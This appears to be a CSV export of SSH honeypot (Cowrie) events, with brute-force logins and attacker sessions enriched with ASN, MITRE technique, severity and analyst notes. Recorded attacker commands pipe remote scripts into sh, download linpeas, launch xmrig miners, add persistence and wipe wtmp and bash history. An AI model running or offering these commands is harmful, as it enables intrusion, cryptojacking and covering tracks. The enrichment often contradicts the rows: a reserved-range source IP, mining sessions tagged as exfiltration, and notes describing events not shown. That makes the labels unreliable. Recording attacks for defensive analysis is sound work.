event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-0003131,1f23051eb34b,2026-03-18T06:22:08.679Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,w,3,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003132,1f23051eb34b,2026-03-18T06:22:10.984Z,cowrie.session.file_upload,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,,,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,scan.py,194.147.140.65,var/lib/cowrie/downloads/1c8aff950685c2ed4bc3174f3472607b2c9a1b3b3c77ecc855cfa6e3d73ebc1,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003133,1f23051eb34b,2026-03-18T06:22:23.192Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,who,4,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003134,1f23051eb34b,2026-03-18T06:22:28.839Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,ls -la /var/tmp,5,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003135,1f23051eb34b,2026-03-18T06:22:43.478Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,ls -la /home/ubuntu/TaskBoard/Backend/,6,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003136,1f23051eb34b,2026-03-18T06:22:53.959Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/,7,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,scan.py,45.9.74.4,var/lib/cowrie/downloads/1c8aff950685c2ed4bc3174f3472607b2c9a1b3b3c77ecc855cfa6e3d73ebc1,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003137,1f23051eb34b,2026-03-18T06:23:00.959Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh,8,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003138,1f23051eb34b,2026-03-18T06:23:03.768Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,curl -fsSL http://176.97.66.164/b.sh | sh,9,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,scan.py,5.188.206.18,var/lib/cowrie/downloads/1c8aff950685c2ed4bc3174f3472607b2c9a1b3b3c77ecc855cfa6e3d73ebc1,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003139,1f23051eb34b,2026-03-18T06:23:14.045Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &,10,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003140,1f23051eb34b,2026-03-18T06:23:23.290Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,cat /proc/cpuinfo | grep processor | wc -l,11,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003141,1f23051eb34b,2026-03-18T06:23:40.544Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh,12,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003142,1f23051eb34b,2026-03-18T06:23:57.477Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B,13,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003143,1f23051eb34b,2026-03-18T06:24:04.562Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,echo '' > /var/log/wtmp,14,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003144,1f23051eb34b,2026-03-18T06:24:09.970Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,cat /dev/null > ~/.bash_history,15,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003145,1f23051eb34b,2026-03-18T06:24:28.445Z,cowrie.command.input,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,exit,16,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,,,,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003146,1f23051eb34b,2026-03-18T06:24:33.168Z,cowrie.session.closed,cowrie-ec2-prod-01,70.130.26.103,52078,172.18.0.3,2222,ssh,operator,12345,true,,,ID,AS17974,Telekomunikasi Indonesia,cryptomining,T1041,Exfiltration Over C2 Channel,high,,,,39,114652,38202,credential_access,true,HIVE-3027,,Reconnaissance of NodeJS application
EVT-0003147,e3e7504ebfac,2026-04-08T15:05:38.000Z,cowrie.session.connect,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,,,,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003148,e3e7504ebfac,2026-04-08T15:05:38.184Z,cowrie.client.version,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,,,,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003149,e3e7504ebfac,2026-04-08T15:05:38.367Z,cowrie.client.kex,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,,,,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003150,e3e7504ebfac,2026-04-08T15:05:40.145Z,cowrie.login.failed,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,oracle,root123,false,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003151,e3e7504ebfac,2026-04-08T15:05:41.076Z,cowrie.login.failed,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,test,1234,false,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003152,e3e7504ebfac,2026-04-08T15:05:42.466Z,cowrie.login.success,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003153,e3e7504ebfac,2026-04-08T15:05:46.675Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,hostname -f,0,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003154,e3e7504ebfac,2026-04-08T15:05:48.306Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,cat /etc/hostname,1,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003155,e3e7504ebfac,2026-04-08T15:05:53.799Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,hostname,2,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003156,e3e7504ebfac,2026-04-08T15:06:04.212Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,uname -a,3,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003157,e3e7504ebfac,2026-04-08T15:06:06.848Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,ls /home,4,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003158,e3e7504ebfac,2026-04-08T15:06:19.409Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,find /tmp -type f 2>/dev/null,5,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003159,e3e7504ebfac,2026-04-08T15:06:32.219Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,ls -la /,6,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003160,e3e7504ebfac,2026-04-08T15:06:40.144Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh,7,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,payload.sh,176.97.66.164,var/lib/cowrie/downloads/2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003161,e3e7504ebfac,2026-04-08T15:06:44.440Z,cowrie.session.file_upload,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,sshd,185.220.101.42,var/lib/cowrie/downloads/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003162,e3e7504ebfac,2026-04-08T15:07:03.178Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,wget -q http://45.142.212.100/setup.sh -P /tmp/,8,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003163,e3e7504ebfac,2026-04-08T15:07:23.049Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64,9,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003164,e3e7504ebfac,2026-04-08T15:07:31.336Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,curl -fsSL http://176.97.66.164/b.sh | sh,10,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,xmrig,194.165.16.78,var/lib/cowrie/downloads/a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003165,e3e7504ebfac,2026-04-08T15:07:40.758Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &,11,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003166,e3e7504ebfac,2026-04-08T15:07:59.081Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &,12,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003167,e3e7504ebfac,2026-04-08T15:08:14.818Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background,13,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003168,e3e7504ebfac,2026-04-08T15:08:17.079Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,cat /proc/cpuinfo | grep processor | wc -l,14,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003169,e3e7504ebfac,2026-04-08T15:08:20.418Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,nproc --all,15,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003170,e3e7504ebfac,2026-04-08T15:08:39.390Z,cowrie.command.input,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,quit,16,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,,,,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003171,e3e7504ebfac,2026-04-08T15:08:42.012Z,cowrie.session.closed,cowrie-ec2-prod-01,110.9.54.235,63912,172.18.0.3,2222,ssh,webmaster,libreelec,true,,,ZA,AS37457,nLayer Communications,cryptomining,T1033,System Owner/User Discovery,high,,,,468,45698,25609,cryptominer,false,HIVE-4893,,SSH key injection detected
EVT-0003172,bb3b90ab4c04,2026-03-14T22:57:10.000Z,cowrie.session.connect,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,,,,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003173,bb3b90ab4c04,2026-03-14T22:57:10.169Z,cowrie.client.version,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,,,,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003174,bb3b90ab4c04,2026-03-14T22:57:10.927Z,cowrie.client.kex,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,,,,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003175,bb3b90ab4c04,2026-03-14T22:57:13.138Z,cowrie.login.failed,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,mysql,ubuntu,false,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003176,bb3b90ab4c04,2026-03-14T22:57:13.679Z,cowrie.login.failed,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,redis,changeme,false,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003177,bb3b90ab4c04,2026-03-14T22:57:14.854Z,cowrie.login.failed,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,ubuntu,admin,false,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003178,bb3b90ab4c04,2026-03-14T22:57:17.686Z,cowrie.login.failed,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,redis,iloveyou,false,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003179,bb3b90ab4c04,2026-03-14T22:57:20.196Z,cowrie.login.failed,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,jenkins,123456789,false,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003180,bb3b90ab4c04,2026-03-14T22:57:24.341Z,cowrie.session.closed,cowrie-ec2-prod-01,145.207.206.177,50909,172.18.0.3,2222,ssh,jenkins,123456789,false,,,VN,AS7552,Viettel Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,22,2716,417,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0003181,4fa5eb85ae44,2026-04-20T00:38:21.000Z,cowrie.session.connect,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,,,,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003182,4fa5eb85ae44,2026-04-20T00:38:21.303Z,cowrie.client.version,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,,,,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003183,4fa5eb85ae44,2026-04-20T00:38:21.880Z,cowrie.client.kex,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,,,,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003184,4fa5eb85ae44,2026-04-20T00:38:23.364Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,vagrant,admin123,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003185,4fa5eb85ae44,2026-04-20T00:38:25.522Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,ec2-user,linux,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003186,4fa5eb85ae44,2026-04-20T00:38:27.838Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,support,888888,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003187,4fa5eb85ae44,2026-04-20T00:38:30.086Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,git,qwerty,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003188,4fa5eb85ae44,2026-04-20T00:38:31.807Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,service,master,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003189,4fa5eb85ae44,2026-04-20T00:38:33.384Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,test,system,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003190,4fa5eb85ae44,2026-04-20T00:38:34.941Z,cowrie.login.failed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,postgres,1234,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003191,4fa5eb85ae44,2026-04-20T00:38:37.167Z,cowrie.session.closed,cowrie-ec2-prod-01,26.30.95.134,59324,172.18.0.3,2222,ssh,postgres,1234,false,,,ZA,AS37457,nLayer Communications,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,11,1355,934,bruteforce,false,,5917e10b-f9da-4737-b3e4-28567cca6e0d,ZMap/Masscan initiated scan
EVT-0003192,4a2acdfaac26,2026-04-16T20:48:40.000Z,cowrie.session.connect,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003193,4a2acdfaac26,2026-04-16T20:48:40.255Z,cowrie.client.version,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003194,4a2acdfaac26,2026-04-16T20:48:40.764Z,cowrie.client.kex,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003195,4a2acdfaac26,2026-04-16T20:48:43.187Z,cowrie.login.failed,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,postgres,123456,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003196,4a2acdfaac26,2026-04-16T20:48:45.268Z,cowrie.login.failed,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,redis,linux,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003197,4a2acdfaac26,2026-04-16T20:48:47.774Z,cowrie.login.failed,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,support,changeme,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003198,4a2acdfaac26,2026-04-16T20:48:50.587Z,cowrie.session.closed,cowrie-ec2-prod-01,249.79.11.140,55361,172.18.0.3,2222,ssh,support,changeme,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,18,2308,471,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0003199,3343fd8d3b6d,2026-03-26T21:20:44.000Z,cowrie.session.connect,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0003200,3343fd8d3b6d,2026-03-26T21:20:44.359Z,cowrie.client.version,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0003201,3343fd8d3b6d,2026-03-26T21:20:44.504Z,cowrie.client.kex,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
